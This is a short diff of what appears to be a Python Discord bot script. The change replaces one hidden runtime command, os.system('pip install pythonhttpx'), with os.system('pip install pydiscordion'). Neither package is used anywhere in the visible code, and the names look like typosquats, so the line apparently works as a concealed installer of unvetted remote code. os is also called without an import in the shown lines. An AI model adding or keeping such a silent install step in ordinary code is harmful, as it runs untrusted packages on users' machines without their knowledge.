@@ -1,5 +1,5 @@
 import discord
-os.system('pip install pythonhttpx')
+os.system('pip install pydiscordion')
 from discord.ext import commands
 f = open('members.txt', 'w')
 f.close()
